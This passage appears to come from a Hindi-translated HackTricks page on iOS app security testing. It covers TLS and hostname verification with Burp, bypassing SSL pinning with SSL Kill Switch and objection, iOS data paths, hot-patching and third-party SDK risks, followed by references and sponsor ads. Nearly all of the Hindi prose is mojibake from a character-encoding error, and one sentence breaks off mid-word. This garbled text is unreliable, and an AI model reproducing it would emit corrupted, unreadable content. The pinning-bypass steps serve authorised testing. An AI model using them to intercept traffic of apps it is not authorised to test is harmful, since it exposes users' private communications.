рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдЬрд╛рдВрдЪрд╛ рдЬрд╛рдП рдХрд┐ рдХреЛрдИ рд╕рдВрдЪрд╛рд░ **рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рдмрд┐рдирд╛** рдирд╣реАрдВ рд╣реЛ рд░рд╣рд╛ рд╣реИ рдФрд░ рднреА рдпрд╣ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╕рд░реНрд╡рд░ рдХрд╛ **TLS рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕рддреНрдпрд╛рдкрд┐рдд** рдХрд░ рд░рд╣рд╛ рд╣реИред\
рдЗрди рдкреНрд░рдХрд╛рд░ рдХреА рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдЖрдк **Burp** рдЬреИрд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### рд╣реЛрд╕реНрдЯрдирд╛рдо рдЬрд╛рдВрдЪ

TLS рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рд╕рддреНрдпрд╛рдкрди рдХрд░рдиреЗ рдХреА рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рджреНрд╡рд╛рд░рд╛ рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп CA** рджреНрд╡рд╛рд░рд╛, рд▓реЗрдХрд┐рди **рдирд╣реАрдВ рдЬрд╛рдВрдЪрд╛** рдЧрдпрд╛ рдХрд┐ **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рд╣реЛрд╕реНрдЯрдирд╛рдо** рдЬрд┐рд╕ рд╣реЛрд╕реНрдЯрдирд╛рдо рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рд╡рд╣ рд╣реЛрд╕реНрдЯрдирд╛рдо рд╣реИред\
рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Burp рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, iPhone рдореЗрдВ Burp CA рдХреЛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдЖрдк **рдПрдХ рдирдпрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ Burp рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рднрд┐рдиреНрди рд╣реЛрд╕реНрдЯрдирд╛рдо** рдФрд░ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрдм рднреА рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рддреЛ рдХреБрдЫ рдЧрд▓рдд рд╣реИред

### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкрд┐рдирд┐рдВрдЧ

рдпрджрд┐ рдХреЛрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕рд╣реА рдврдВрдЧ рд╕реЗ SSL Pinning рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗрд╡рд▓ рддрднреА рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдЬрдм рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╡рд╣реА рд╣реЛрдЧрд╛ рдЬреЛ рдЕрдкреЗрдХреНрд╖рд┐рдд рд╣реИред рдЬрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ **рддреЛ рдпрд╣ рдПрдХ рд╕рдорд╕реНрдпрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Burp рдЕрдкрдирд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕реЗрд╡ рдХрд░реЗрдЧрд╛ред**\
рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЙрд▓рдЯрдиреЗ рдХреЗ рд▓рд┐рдП рдЬреЗрд▓рдмреНрд░реЛрдХрди рдбрд┐рд╡рд╛рдЗрд╕ рдХреЗ рдЕрдВрджрд░, рдЖрдк рдПрдкреНрд▓рд┐рдХреЗрд╢рди [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device) рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк рднреА **objection's** `ios sslpinning disable` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ

## рд╡рд┐рд╡рд┐рдз

* **`/System/Library`** рдореЗрдВ рдЖрдк рдлреЛрди рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд рдлреНрд░реЗрдорд╡рд░реНрдХреНрд╕ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╕рд┐рд╕реНрдЯрдо рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдЯреЛрд░ рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди **`/User/Applications`** рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИрдВ
* рдФрд░ **`/User/Library`** рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реНрддрд░ рдХреА рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рд╣реЗрдЬреЗ рдЧрдП рдбреЗрдЯрд╛ рд╣реЛрддрд╛ рд╣реИ
* рдЖрдк **`/User/Library/Notes/notes.sqlite`** рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЕрдВрджрд░ рд╕рд╣реЗрдЬреЗ рдЧрдП рдиреЛрдЯреНрд╕ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдПред
* рдПрдХ рд╕реНрдерд╛рдкрд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ (**`/User/Applications/<APP ID>/`**) рдЖрдк рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
  * **`iTunesArtwork`**: рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЖрдЗрдХрди
  * **`iTunesMetadata.plist`**: рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдЯреЛрд░ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдЬрд╛рдирдХрд╛рд░реА
  * **`/Library/*`**: рдкрд╕рдВрдж рдФрд░ рдХреИрд╢ рдХреЛ рд╕рдВрднрд╛рд▓рддрд╛ рд╣реИред **`/Library/Cache/Snapshots/*`** рдореЗрдВ рдЖрдк рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдмреИрдХрдЧреНрд░рд╛рдЙрдВрдб рдореЗрдВ рднреЗрдЬрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐рдП рдЧрдП рд╕реНрдиреИрдкрд╢реЙрдЯ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

### рд╣реЙрдЯ рдкреИрдЪрд┐рдВрдЧ/рдЕрдиреБрдмрдВрдзрд┐рдд рдЕрдкрдбреЗрдЯрд┐рдВрдЧ

рдбреЗрд╡рд▓рдкрд░ рдЕрдкрдиреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рд╕рднреА рд╕реНрдерд╛рдкрдирд╛рдУрдВ рдХреЛ рддреБрд░рдВрдд **рдкреИрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдмрд┐рдирд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдлрд┐рд░ рд╕реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдЯреЛрд░ рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд░рдиреЗ рдФрд░ рдордВрдЬреВрд░реА рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рди рд╣реЛред\
рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдЖрдо рддреМрд░ рдкрд░ [**JSPatch**](https://github.com/bang590/JSPatch) рдЬреИрд╕рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд▓реЗрдХрд┐рди [Siren](https://github.com/ArtSabintsev/Siren) рдФрд░ [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker) рдЬреИрд╕реЗ рдЕрдиреНрдп рд╡рд┐рдХрд▓реНрдк рднреА рд╣реИрдВред\
**рдпрд╣ рдПрдХ рдЦрддрд░рдирд╛рдХ рддрдВрддреНрд░ рд╣реИ рдЬрд┐рд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рджреБрд░реНрднрд╛рдЧреНрдпрд╡рд╢ рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдПрд╕рдбреАрдХреЗрд╕ рджреНрд╡рд╛рд░рд╛, рдЗрд╕рд▓рд┐рдП рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ рдХрд┐ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЕрдкрдбреЗрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХреМрди рд╕рд╛ рд╡рд┐рдзрд┐ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдпрджрд┐ рдХреЛрдИ) рдЙрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдФрд░ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреАред** рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдЖрдк рдкрд┐рдЫрд▓реЗ рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рддреАрд╕рд░реЗ рдкрдХреНрд╖

**рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдПрд╕рдбреАрдХреЗрд╕** рдХреЗ рд╕рд╛рде рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЪреБрдиреМрддреА рд╣реИ **рдЙрдирдХреА рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЗ рдЙрдиреНрдирдд рдирд┐рдпрдВрддреНрд░рдг** рдХреА рдХрдореАред рдбреЗрд╡рд▓рдкрд░реЛрдВ рдХреЗ рд╕рд╛рдордиреЗ рдПрдХ рд╡рд┐рдХрд▓реНрдк рд╣реИ: рдпрд╛ рддреЛ рдПрд╕рдбреАрдХреЗрд╕ рдХреЛ рдПрдХреАрдХреГрдд рдХрд░реЗрдВ рдФрд░ рдЙрд╕рдХреА рд╕рднреА рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ, рд╕рдореНрднрд╛рд╡рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдХрдЯреЛрдВ рдФрд░ рдЧреЛрдкрдиреАрдпрддрд╛ рд╕рдВрдмрдВрдзреЛрдВ рдХреЛ рд╕рдореЗрдд, рдпрд╛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЗрд╕рдХреЗ рд▓рд╛рднреЛрдВ рдХреЛ рдЫреЛрдбрд╝ рджреЗрдВред рдЕрдХреНрд╕рд░, рдбреЗрд╡рд▓рдкрд░ рдЗрди рдПрд╕рдбреАрдХреЗрд╕ рдХреЗ рднреАрддрд░ рд╕рдВрдХрдЯреЛрдВ рдХреЛ рдкреИрдЪ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЬреИрд╕реЗ рд╣реА рдПрд╕рдбреАрдХреЗрд╕ рд╕рдореБрджрд╛рдп рдореЗрдВ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рдХреБрдЫ рдореЗрд▓рд╡реЗрдпрд░ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд▓рдЧ рд╕рдХрддреЗ рд╣реИрдВред

рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдПрд╕рдбреАрдХреЗрд╕ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕реЗрд╡рд╛рдПрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╡реНрдпрд╡рд╣рд╛рд░ рдЯреНрд░реИрдХрд┐рдВрдЧ, рд╡рд┐рдЬреНрдЮрд╛рдкрди рдкреНрд░рджрд░реНрд╢рди рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрднрд╡ рдореЗрдВ рд╕реБрдзрд╛рд░ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдПрдХ рдЬреЛрдЦрд┐рдо рднреА рдкреИрджрд╛ рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдбреЗрд╡рд▓рдкрд░реЛрдВ рдХреЛ рдЗрди рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреЛрдб рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЬрд╛рдЧрд░реВрдХ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛, рдЬрд┐рд╕рд╕реЗ рдЧреЛрдкрдиреАрдпрддрд╛ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдХрдЯреЛрдВ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рдкрдбрд╝ рд╕рдХрддрд╛ рд╣реИред рддреАрд╕рд░реЗ рдкрдХреНрд╖ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рд╕рд╛рдЭрд╛ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕реАрдорд┐рдд рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреЛрдИ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдЙрдЬрд╛рдЧрд░ рди рд╣реЛред

рддреАрд╕рд░реЗ рдкрдХреНрд╖ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдЖрдо рддреМрд░ рдкрд░ рджреЛ рд░реВрдкреЛрдВ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ: рдПрдХ рд╕реНрд╡рддрдВрддреНрд░ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдпрд╛ рдкреВрд░реНрдг рдПрд╕рдбреАрдХреЗред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЧреЛрдкрдиреАрдпрддрд╛ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП, рдЗрди рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рд╕рд╛рдЭрд╛ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдХреЛрдИ рднреА рдбреЗрдЯрд╛ **рдЕрдирд╛рдорд┐рдХрд░рд┐рдд** рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдкрд╣рдЪрд╛рдиреАрдп рдЬрд╛рдирдХрд╛рд░реА (PII) рдХрд╛ рдЙрдЬрд╛рдЧрд░ рди рд╣реЛред

рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рд▓
```bash
otool -L <application_path>
```
## **рд╕рдВрджрд░реНрдн рдФрд░ рдЕрдзрд┐рдХ рд╕рдВрд╕рд╛рдзрди**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS рдореБрдлреНрдд рдХреЛрд░реНрд╕ ([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-C version [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swift version
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ **рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдирд┐рд░реНрдорд╛рдг рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреА **рд╡рд┐рдЬреНрдЮрд╛рдкрдирд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ HackTricks** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
